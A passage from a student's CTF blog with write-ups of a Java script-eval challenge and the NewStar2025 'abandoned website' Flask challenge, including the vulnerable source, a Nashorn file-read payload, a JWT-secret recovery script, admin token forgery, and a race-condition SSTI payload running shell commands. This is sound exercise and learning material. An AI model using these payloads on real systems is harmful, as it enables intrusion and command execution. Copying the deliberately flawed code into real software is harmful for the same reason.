this.BLACKLIST) &#123;</span><br><span class="line">            <span class="keyword">if</span> (content.<span class="title function_ invoke__">contains</span>(word)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;Blacklisted word detected: &quot;</span> + word;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        Object result = (<span class="keyword">new</span> <span class="title class_">ScriptEngineManager</span>()).<span class="title function_ invoke__">getEngineByName</span>(<span class="string">&quot;js&quot;</span>).<span class="keyword">eval</span>(content);</span><br><span class="line">        <span class="keyword">return</span> result.<span class="title function_ invoke__">toString</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @<span class="title function_ invoke__">GetMapping</span>(&#123;<span class="string">&quot;/&quot;</span>&#125;)</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_ invoke__">home</span>(Model model) throws <span class="built_in">Exception</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;index&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @<span class="title function_ invoke__">GetMapping</span>(&#123;<span class="string">&quot;/calc&quot;</span>&#125;)</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_ invoke__">status</span>(@<span class="title function_ invoke__">RequestParam</span>(<span class="string">&quot;content&quot;</span>) String content, Model model) throws <span class="built_in">Exception</span> &#123;</span><br><span class="line">        model.<span class="title function_ invoke__">addAttribute</span>(<span class="string">&quot;result&quot;</span>, this.<span class="title function_ invoke__">calculate</span>(content));</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;index&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>直接ai梭哈,猜&#x2F;flag</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Java.type(&#x27;java.nio.file.Files&#x27;).readAllLines(Java.type(&#x27;java.nio.file.Paths&#x27;).get(&quot;/flag&quot;),Java.type(&#x27;java.nio.charset.StandardCharsets&#x27;).UTF_8).toString()</span><br></pre></td></tr></table></figure>

<p><img src="https://bucketqiao123456.oss-cn-beijing.aliyuncs.com/image-20251130230036669.png" alt="image-20251130230036669"></p>
<h1 id="12-NewStar2025-week5-废弃的网站"><a href="#12-NewStar2025-week5-废弃的网站" class="headerlink" title="12.NewStar2025-week5 废弃的网站"></a>12.NewStar2025-week5 废弃的网站</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask import Flask, request, render_template, abort, redirect, render_template_string</span><br><span class="line">import jwt, hashlib, time</span><br><span class="line"></span><br><span class="line">app = <span class="title function_ invoke__">Flask</span>(__name__)</span><br><span class="line">time_started = <span class="title function_ invoke__">round</span>(time.<span class="title function_ invoke__">time</span>())</span><br><span class="line"><span class="keyword">print</span>(f<span class="string">&quot;System started at &#123;time_started&#125;&quot;</span>)</span><br><span class="line">APP_SECRET = hashlib.<span class="title function_ invoke__">sha256</span>(<span class="title function_ invoke__">str</span>(time_started).<span class="title function_ invoke__">encode</span>()).<span class="title function_ invoke__">hexdigest</span>()</span><br><span class="line"></span><br><span class="line">tempuser = None</span><br><span class="line"></span><br><span class="line">USER_DB = &#123;</span><br><span class="line">    <span class="string">&quot;admin&quot;</span>: &#123;<span class="string">&quot;id&quot;</span>: <span class="number">1</span>, <span class="string">&quot;role&quot;</span>: <span class="string">&quot;admin&quot;</span>, <span class="string">&quot;name&quot;</span>: <span class="string">&quot;Administrator&quot;</span>&#125;,</span><br><span class="line">    <span class="string">&quot;guest&quot;</span>: &#123;<span class="string">&quot;id&quot;</span>: <span class="number">2</span>, <span class="string">&quot;role&quot;</span>: <span class="string">&quot;guest&quot;</span>, <span class="string">&quot;name&quot;</span>: <span class="string">&quot;Guest User&quot;</span>&#125;,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">def <span class="title function_ invoke__">admin_required</span>(f):</span><br><span class="line">    def <span class="title function_ invoke__">wrapper</span>(*args, **kwargs):</span><br><span class="line">        cookie = request.cookies.<span class="title function_ invoke__">get</span>(<span class="string">&#x27;session&#x27;</span>, None)</span><br><span class="line">        <span class="keyword">if</span> cookie is None:</span><br><span class="line">            </span><br><span class="line">            response = <span class="title function_ invoke__">redirect</span>(<span class="string">&#x27;/&#x27;</span>)</span><br><span class="line">            session = jwt.<span class="title function_ invoke__">encode</span>(USER_DB[<span class="string">&#x27;guest&#x27;</span>], APP_SECRET, algorithm=<span class="string">&#x27;HS256&#x27;</span>)</span><br><span class="line">            response.<span class="title function_ invoke__">set_cookie</span>(<span class="string">&#x27;session&#x27;</span>, session)</span><br><span class="line">            <span class="keyword">return</span> response</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            user_data = jwt.<span class="title function_ invoke__">decode</span>(cookie, APP_SECRET, algorithms=[<span class="string">&#x27;HS256&#x27;</span>])</span><br><span class="line">            <span class="keyword">if</span> user_data[<span class="string">&#x27;role&#x27;</span>] != <span class="string">&#x27;admin&#x27;</span>:</span><br><span class="line">                <span class="title function_ invoke__">abort</span>(<span class="number">403</span>, description=<span class="string">&quot;Admin access required.&quot;</span>)</span><br><span class="line">            <span class="keyword">if</span> user_data[<span class="string">&#x27;name&#x27;</span>] != <span class="string">&#x27;Administrator&#x27;</span>:</span><br><span class="line">                <span class="title function_ invoke__">abort</span>(<span class="number">403</span>, description=<span class="string">&quot;Admin access required.&quot;</span>)</span><br><span class="line">            time.<span class="title function_ invoke__">sleep</span>(<span class="number">0.15</span>)	</span><br><span class="line">        except jwt.InvalidTokenError:</span><br><span class="line">            <span class="title function_ invoke__">abort</span>(<span class="number">401</span>, description = f<span class="string">&quot;Session expired. Please log in again. System has been running &#123;round(time.time() - time_started)&#125; seconds.&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">f</span>(*args, **kwargs)</span><br><span class="line">    wrapper.__name__ = f.__name__</span><br><span class="line">    <span class="keyword">return</span> wrapper</span><br><span class="line"></span><br><span class="line">@app.before_request	<span class="comment">#Flask的请求钩子，它会在每个http请求处理之前自动执行</span></span><br><span class="line">def <span class="title function_ invoke__">load_user</span>():</span><br><span class="line">    <span class="keyword">if</span> request.endpoint == <span class="string">&#x27;static&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    <span class="keyword">global</span> tempuser	<span class="comment">#全局变量</span></span><br><span class="line">    cookie = request.cookies.<span class="title function_ invoke__">get</span>(<span class="string">&#x27;session&#x27;</span>, None)</span><br><span class="line">    <span class="keyword">if</span> cookie is None:</span><br><span class="line">        tempuser = USER_DB[<span class="string">&#x27;guest&#x27;</span>]</span><br><span class="line">        session = jwt.<span class="title function_ invoke__">encode</span>(tempuser, APP_SECRET, algorithm=<span class="string">&#x27;HS256&#x27;</span>)</span><br><span class="line">        response = <span class="title function_ invoke__">redirect</span>(request.path)</span><br><span class="line">        response.<span class="title function_ invoke__">set_cookie</span>(<span class="string">&#x27;session&#x27;</span>, session)</span><br><span class="line">        <span class="keyword">return</span> response</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        user_data = jwt.<span class="title function_ invoke__">decode</span>(cookie, APP_SECRET, algorithms=[<span class="string">&#x27;HS256&#x27;</span>])</span><br><span class="line">        tempuser = user_data	</span><br><span class="line">    except jwt.InvalidTokenError:</span><br><span class="line">        session = jwt.<span class="title function_ invoke__">encode</span>(USER_DB[<span class="string">&#x27;guest&#x27;</span>], APP_SECRET, algorithm=<span class="string">&#x27;HS256&#x27;</span>)</span><br><span class="line">        content = <span class="title function_ invoke__">render_template_string</span>(</span><br><span class="line">            <span class="string">&quot;Session expired. Please log in again. System has been running %d seconds.&quot;</span> %</span><br><span class="line">            (<span class="title function_ invoke__">round</span>(time.<span class="title function_ invoke__">time</span>() - time_started))</span><br><span class="line">        )</span><br><span class="line">        response = app.<span class="title function_ invoke__">make_response</span>((content, <span class="number">401</span>))</span><br><span class="line">        response.<span class="title function_ invoke__">set_cookie</span>(<span class="string">&#x27;session&#x27;</span>, session)</span><br><span class="line">        <span class="keyword">return</span> response</span><br><span class="line">    </span><br><span class="line">@app.<span class="title function_ invoke__">route</span>(<span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>])</span><br><span class="line">def <span class="title function_ invoke__">home</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">render_template</span>(<span class="string">&#x27;index.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@app.<span class="title function_ invoke__">route</span>(<span class="string">&quot;/admin&quot;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>])</span><br><span class="line">@admin_required</span><br><span class="line">def <span class="title function_ invoke__">admin_panel</span>():</span><br><span class="line">    <span class="keyword">global</span> tempuser</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">render_template_string</span>(<span class="string">&quot;Welcome Back, %s&quot;</span> % tempuser[<span class="string">&#x27;name&#x27;</span>])</span><br><span class="line"></span><br><span class="line">@app.<span class="title function_ invoke__">route</span>(<span class="string">&quot;/static/&lt;path:filename&gt;&quot;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>])</span><br><span class="line">def <span class="title function_ invoke__">serve_static</span>(filename):</span><br><span class="line">    <span class="keyword">if</span> not filename.<span class="title function_ invoke__">endswith</span>(<span class="string">&#x27;.png&#x27;</span>):</span><br><span class="line">        <span class="title function_ invoke__">abort</span>(<span class="number">403</span>, description=<span class="string">&quot;Only .png files are allowed.&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> app.<span class="title function_ invoke__">send_static_file</span>(filename)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.<span class="title function_ invoke__">run</span>(host=<span class="string">&quot;0.0.0.0&quot;</span>, port=<span class="number">5000</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>发现render_template_string的ssti，但是想执行命令要admin，密钥是服务器启动时间，当jwt解析错误就会回显系统运行的时间，考虑时间误差，计算出的时间要+-1试试，所以写代码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import time</span><br><span class="line">import hashlib</span><br><span class="line">import re</span><br><span class="line"></span><br><span class="line">def <span class="title function_ invoke__">get_app_secret</span>():</span><br><span class="line">    target_url = <span class="string">&quot;http://8.147.132.32:24710/admin&quot;</span></span><br><span class="line">    cookies = &#123;</span><br><span class="line">        <span class="string">&#x27;td_cookie&#x27;</span>: <span class="string">&#x27;2928931217&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;session&#x27;</span>: <span class="string">&#x27;1&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        response = requests.<span class="title function_ invoke__">get</span>(target_url, cookies=cookies, timeout=<span class="number">5</span>)</span><br><span class="line">        <span class="keyword">match</span> = re.<span class="title function_ invoke__">search</span>(r<span class="string">&#x27;System has been running (\d+) seconds&#x27;</span>, response.text)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">match</span>:</span><br><span class="line">            uptime = <span class="keyword">int</span>(<span class="keyword">match</span>.<span class="title function_ invoke__">group</span>(<span class="number">1</span>))</span><br><span class="line">            current_time = <span class="keyword">int</span>(time.<span class="title function_ invoke__">time</span>())</span><br><span class="line">            </span><br><span class="line">            <span class="comment"># 考虑时间误差，计算多个可能的启动时间</span></span><br><span class="line">            <span class="keyword">for</span> offset in <span class="title function_ invoke__">range</span>(-<span class="number">1</span>, <span class="number">2</span>):  </span><br><span class="line">                time_started = current_time - uptime + offset</span><br><span class="line">                app_secret = hashlib.<span class="title function_ invoke__">sha256</span>(<span class="title function_ invoke__">str</span>(time_started).<span class="title function_ invoke__">encode</span>()).<span class="title function_ invoke__">hexdigest</span>()</span><br><span class="line">                </span><br><span class="line">                <span class="keyword">print</span>(f<span class="string">&quot;启动时间(&#123;offset&#125;): &#123;time_started&#125;&quot;</span>)</span><br><span class="line">                <span class="keyword">print</span>(f<span class="string">&quot;密钥(&#123;offset&#125;): &#123;app_secret&#125;&quot;</span>)</span><br><span class="line">                <span class="keyword">print</span>(<span class="string">&quot;-&quot;</span> * <span class="number">50</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">print</span>(<span class="string">&quot;无法提取运行时间&quot;</span>)</span><br><span class="line">    except <span class="built_in">Exception</span> <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">print</span>(f<span class="string">&quot;请求失败: &#123;e&#125;&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="title function_ invoke__">get_app_secret</span>()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>伪造admin</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">import jwt</span><br><span class="line">import datetime</span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义标头（Headers）</span></span><br><span class="line">headers = &#123;</span><br><span class="line">  <span class="string">&quot;alg&quot;</span>: <span class="string">&quot;HS256&quot;</span>,</span><br><span class="line">  <span class="string">&quot;typ&quot;</span>: <span class="string">&quot;JWT&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义有效载体（Payload）</span></span><br><span class="line">token_dict = &#123;</span><br><span class="line">  <span class="string">&quot;id&quot;</span>: <span class="number">1</span>,</span><br><span class="line">  <span class="string">&quot;role&quot;</span>: <span class="string">&quot;admin&quot;</span>,</span><br><span class="line">  <span class="string">&quot;name&quot;</span>: <span class="string">&quot;Administrator&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 密钥</span></span><br><span class="line">secret = <span class="string">&#x27;c484d1e6ed651fc48231d0629ec282172fe9f41c0d74fd8c2ea34bc325ca8b83&#x27;</span></span><br><span class="line"></span><br><span class="line">jwt_token = jwt.<span class="title function_ invoke__">encode</span>(token_dict, secret, algorithm=<span class="string">&#x27;HS256&#x27;</span>, headers=headers)</span><br><span class="line"><span class="keyword">print</span>(<span class="string">&quot;JWT Token:&quot;</span>, jwt_token)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import threading</span><br><span class="line">import jwt</span><br><span class="line"></span><br><span class="line">target_url = <span class="string">&quot;http://8.147.132.32:24710&quot;</span></span><br><span class="line">secret = <span class="string">&#x27;c484d1e6ed651fc48231d0629ec282172fe9f41c0d74fd8c2ea34bc325ca8b83&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建两个token</span></span><br><span class="line">admin_token = jwt.<span class="title function_ invoke__">encode</span>(&#123;<span class="string">&quot;id&quot;</span>: <span class="number">1</span>, <span class="string">&quot;role&quot;</span>: <span class="string">&quot;admin&quot;</span>, <span class="string">&quot;name&quot;</span>: <span class="string">&quot;Administrator&quot;</span>&#125;, secret, algorithm=<span class="string">&#x27;HS256&#x27;</span>)</span><br><span class="line">ssti_token = jwt.<span class="title function_ invoke__">encode</span>(&#123;<span class="string">&quot;id&quot;</span>: <span class="number">2</span>, <span class="string">&quot;role&quot;</span>: <span class="string">&quot;guest&quot;</span>, <span class="string">&quot;name&quot;</span>: <span class="string">&quot;&#123;&#123;lipsum.__globals__.os.popen(&#x27;cat /f*&#x27;).read()&#125;&#125;&quot;</span>&#125;, secret, algorithm=<span class="string">&#x27;HS256&#x27;</span>)</span><br><span class="line"></span><br><span class="line">def <span class="title function_ invoke__">send_admin_request</span>():</span><br><span class="line">    <span class="string">&quot;&quot;</span><span class="string">&quot;发送admin请求&quot;</span><span class="string">&quot;&quot;</span></span><br><span class="line">    cookies = &#123;<span class="string">&#x27;td_cookie&#x27;</span>: <span class="string">&#x27;2928931217&#x27;</span>, <span class="string">&#x27;session&#x27;</span>: admin_token&#125;</span><br><span class="line">    response = requests.<span class="title function_ invoke__">get</span>(f<span class="string">&quot;&#123;target_url&#125;/admin&quot;</span>, cookies=cookies)</span><br><span class="line">    <span class="keyword">print</span>(f<span class="string">&quot;[+] 成功! 响应: &#123;response.text&#125;&quot;</span>)</span><br><span class="line"></span><br><span class="line">def <span class="title function_ invoke__">send_ssti_request</span>():</span><br><span class="line">    <span class="string">&quot;&quot;</span><span class="string">&quot;发送SSTI请求到首页来设置tempuser&quot;</span><span class="string">&quot;&quot;</span></span><br><span class="line">    cookies = &#123;<span class="string">&#x27;td_cookie&#x27;</span>: <span class="string">&#x27;2928931217&#x27;</span>, <span class="string">&#x27;session&#x27;</span>: ssti_token&#125;</span><br><span class="line">    response = requests.<span class="title function_ invoke__">get</span>(target_url, cookies=cookies)  <span class="comment"># 访问首页来设置tempuser</span></span><br><span class="line">    <span class="comment"># 这里不需要打印，因为我们只关心admin请求的结果</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建并启动线程</span></span><br><span class="line"><span class="keyword">for</span> i in <span class="title function_ invoke__">range</span>(<span class="number">100</span>):  <span class="comment"># 尝试100次</span></span><br><span class="line">    t1 = threading.<span class="title function_ invoke__">Thread</span>(target=send_admin_request)</span><br><span class="line">    t2 = threading.<span class="title function_ invoke__">Thread</span>(target=send_ssti_request)</span><br><span class="line">    t1.<span class="title function_ invoke__">start</span>()</span><br><span class="line">    t2.<span class="title function_ invoke__">start</span>()</span><br><span class="line">    t1.<span class="title function_ invoke__">join</span>()</span><br><span class="line">    t2.<span class="title function_ invoke__">join</span>()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h1 id="下周目标-1"><a href="#下周目标-1" class="headerlink" title="下周目标"></a>下周目标</h1><p>把剩下的那道题打通，并尽力打isctf吧</p>
<p>文章直达：</p>
<p><a target="_blank" rel="noopener" href="https://shaneior.github.io/2025/11/26/%E4%BD%A0%E7%BC%BA%E5%A4%B1%E7%9A%84%E9%82%A3%E9%97%A8%E8%AE%A1%E7%AE%97%E6%9C%BA%E8%AF%BE/">https://shaneior.github.io/2025/11/26/%E4%BD%A0%E7%BC%BA%E5%A4%B1%E7%9A%84%E9%82%A3%E9%97%A8%E8%AE%A1%E7%AE%97%E6%9C%BA%E8%AF%BE/</a></p>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="http://example.com">fisssssh</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="http://example.com/2025/11/23/UKY%E5%91%A8%E6%8A%A5/">http://example.com/2025/11/23/UKY%E5%91%A8%E6%8A%A5/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="http://example.com" target="_blank">Fisssssh-Blog</a>！</span></div></div><div class="tag_share"><div class="post-share"><div class="social-share" data-image="/img/9ad575f9f19896781142d83c5cc85a3c.jpg" data-sites="facebook,x,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related" href="/2025/11/26/%E4%BD%A0%E7%BC%BA%E5%A4%B1%E7%9A%84%E9%82%A3%E9%97%A8%E8%AE%A1%E7%AE%97%E6%9C%BA%E8%AF%BE/" title="你缺失的那门计算机课（持续更新）"><img class="cover" src="/img/5f5106950234ef21e6b024e25338fcf3.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="info"><div class="info-1"><div class="info-item-1">上一篇</div><div class="info-item-2">你缺失的那门计算机课（持续更新）</div></div><div class="info-2"><div class="info-item-1">1234567891011121314151617本篇博客是基于作品《你缺失的那门计算机课》进行总结和导读旨在帮助真正意义上的电脑初学者快速上手电脑操作。本篇博客的结构将根据原作分为基础篇，软件篇和进阶篇等并且尽力在原作本就很简洁明了的描述上进行进一步的总结与压缩。本博客起于2025/11/26，并将持续更新...本博客采用 CC BY-NC-SA 4.0 协议许可。您可以在 https://creativecommons.org/licenses/by/4.0/deed.zh-hans 查看该许可的详细信息。原作：《你缺失的那门计算机课》网页版作者：Hans Wan 和 Windy Deng网址：https://www.criwits.top/missing以 CC BY-NC-SA 4.0 协议许可如有任何侵权，请联系本人立即删除！！！  序​       在数字时代，熟练使用电脑是一项必备的生活技能，但现实中许多人却严重缺乏这方面的“常识”。尽管智能手机普及，电脑因其复杂性和不可替代性，其使用技能依然至关重要。 ​        希望读者能以轻松、好奇的心态，通过本书掌握必...</div></div></div></a><a class="pagination-related" href="/2025/11/23/First%20post/" title="本站第一条博客（置顶）"><img class="cover" src="/img/d23a7fe8a8160e662a0f68e32f12acd1.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">本站第一条博客（置顶）</div></div><div class="info-2"><div class="info-item-1">关于本博客本博客建立的目的​       本博客建立是为了记录我本人，也就是Fisssssh，在CTF，文学，哲学以及其他方面的学习与交流过程，并将其更新在本博客上，与全国各地的师傅互相学习。因此，关于博客中出现的非专业用语或表示请多多包涵。另外，本人并非现在才开始学习此类东西，碍于博客建立的日期，后期会酌情补充相关内容，请敬请期待吧（笑） 关于Fisssssh​       本人的ID为Fisssssh（五个s），是来自太原理工大学25级的一名新晋CTFer，目前正在UKFC的子队UKY中进行学习（期望未来可以进入主队），目前主攻web方向，希望能和本战队的队友以及素未谋面的师傅们一起学习进步。 ​      我在2025年9月4日来到太原理工大学，面对新的大学生活，希望我可以用最积极的心态面对未来的挑战，同时我也对新的机遇充满期待，今后的有关见闻，我都会第一时间发布到我的博客上面，希望大家可以互相帮助与学习 关于我的ID​        本人原ID为咸鱼体验（不知道有没有人之前见过我），取咸鱼的英文fish更改而成，寓意自然就是“咸鱼翻身”吧（笑） 关于本人的爱好​     ...</div></div></div></a></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/head.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">fisssssh</div><div class="author-info-description">一个热爱编程与艺术的博客，分享技术见解与创意灵感。</div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">4</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">欢迎来到我的个人博客，探索文学与艺术的精彩世界！！！</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#10-27%E2%80%9311-2%E5%91%A8"><span class="toc-number">1.</span> <span class="toc-text">10.27–11.2周</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%AC%E5%91%A8%E5%A4%8D%E7%8E%B0%E4%BA%86newstar2024%E7%9A%84week1-week3%EF%BC%8C%E5%B9%B6%E4%B8%94%E5%81%9A%E4%BA%86%E5%85%AD%E9%81%93buu%E7%9A%84%E9%A2%98%E7%9B%AE%EF%BC%8Cphp%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%81%8F%E5%A4%9A"><span class="toc-number">1.1.</span> <span class="toc-text">本周复现了newstar2024的week1-week3，并且做了六道buu的题目，php代码审计偏多</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%AC%E5%91%A8%E6%80%BB%E7%BB%93%EF%BC%9A%E5%AD%A6%E5%88%B0%E4%BA%86%E4%B9%8B%E5%89%8D%E6%B2%A1%E6%9C%89%E6%8E%A5%E8%A7%A6%E8%BF%87%E7%9A%84%E7%9F%A5%E8%AF%86%E7%82%B9stash%EF%BC%8Cpython%E6%B2%99%E7%9B%92%E9%80%83%E9%80%B8%EF%BC%8Cjwt%E6%94%B9cookie%E7%AD%89-%E8%A1%A5%E4%B9%A0%E4%BA%86%E4%B8%80%E4%B8%8B%E4%B9%8B%E5%89%8D%E4%BA%86%E8%A7%A3%E4%B8%8D%E5%A4%9F%E7%89%A2%E9%9D%A0%E7%9A%84%E9%83%A8%E5%88%86%E7%9F%A5%E8%AF%86%E7%82%B9"><span class="toc-number">1.2.</span> <span class="toc-text">本周总结：学到了之前没有接触过的知识点stash，python沙盒逃逸，jwt改cookie等,补习了一下之前了解不够牢靠的部分知识点</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#11-3%E2%80%9311-9%E5%91%A8"><span class="toc-number">2.</span> <span class="toc-text">11.3–11.9周</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" 